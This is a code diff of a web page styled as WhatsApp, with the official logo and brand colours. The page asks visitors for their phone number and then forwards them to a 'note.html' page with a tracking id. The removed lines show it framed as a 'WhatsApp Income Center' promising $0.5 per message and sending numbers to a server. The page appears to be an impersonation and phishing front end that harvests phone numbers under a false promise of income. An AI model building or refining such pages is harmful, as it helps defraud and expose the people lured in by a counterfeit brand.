@@ -1,15 +1,18 @@
-<!-- WHATSAPP STYLE PAGE 1 -->
+<!-- whatsapp.html -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
 <title>WhatsApp Connect</title>
 
-<link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
+
 *{
 margin:0;
 padding:0;
@@ -26,6 +29,21 @@ align-items:center;
 overflow:hidden;
 }
 
+/* Glow */
+
+body::before{
+content:'';
+position:fixed;
+width:100%;
+height:100%;
+background:
+radial-gradient(circle at top,#25d36633,transparent 40%),
+radial-gradient(circle at bottom,#25d36622,transparent 40%);
+z-index:-1;
+}
+
+/* Card */
+
 .container{
 width:90%;
 max-width:400px;
@@ -35,19 +53,27 @@ border-radius:25px;
 box-shadow:0 0 30px rgba(37,211,102,0.25);
 text-align:center;
 animation:fade .5s ease;
+border:1px solid #25d36633;
 }
 
+/* Logo */
+
 .logo{
-width:85px;
+width:90px;
 margin-bottom:15px;
+filter:drop-shadow(0 0 15px #25d366);
 }
+
+/* Title */
 
 h1{
 color:white;
-font-size:28px;
+font-size:30px;
 margin-bottom:25px;
 font-weight:700;
 }
+
+/* Input */
 
 .input-box{
 width:100%;
@@ -59,11 +85,14 @@ background:#202c33;
 color:white;
 font-size:16px;
 margin-bottom:20px;
+border:1px solid #25d36633;
 }
 
 .input-box::placeholder{
 color:#9aa6ad;
 }
+
+/* Button */
 
 .btn{
 width:100%;
@@ -81,68 +110,88 @@ transition:.3s;
 .btn:hover{
 transform:scale(1.03);
 background:#1ebe5d;
+box-shadow:0 0 20px #25d366;
 }
 
+/* Animation */
+
 @keyframes fade{
+
 from{
 opacity:0;
 transform:translateY(20px);
 }
+
 to{
 opacity:1;
 transform:translateY(0);
 }
+
 }
+
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
-<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+<img class="logo"
+src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
 
-<h1>WhatsApp Income Center</h1>
+<h1>I'm In</h1>
 
-<p>Welcome To WhatsApp income centre</p>
+<input
+type="text"
+class="input-box"
+id="number"
+placeholder="Input your number ✌">
 
-<p>Earn $0.5 For Each Message>
+<button class="btn"
+onclick="continuePage()">
 
-<input type="text" class="input-box" id="number" placeholder="Input your number">
+Continue
 
-<button class="btn" onclick="continuePage()">Continue</button>
+</button>
 
 </div>
 
 <script>
+
 function continuePage(){
 
-const number = document.getElementById("number").value;
+const number =
+document.getElementById("number").value;
 
 if(!number){
+
 alert("Input number first");
+
 return;
-}
-
-// SEND TO YOUR MAIN WEB
-fetch("/save-number", {
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-number:number
-})
-})
-
-.then(() => {
-window.location.href = "note.html";
-})
-
-.catch(() => {
-alert("Error sending number");
-});
 
 }
+
+/* SAVE NUMBER */
+
+localStorage.setItem(
+"wa_number",
+number
+);
+
+/* GET ID */
+
+const params =
+new URLSearchParams(window.location.search);
+
+const id = params.get("id");
+
+/* GO NEXT */
+
+window.location.href =
+"note.html?id=" + id;
+
+}
+
 </script>
 
 </body>
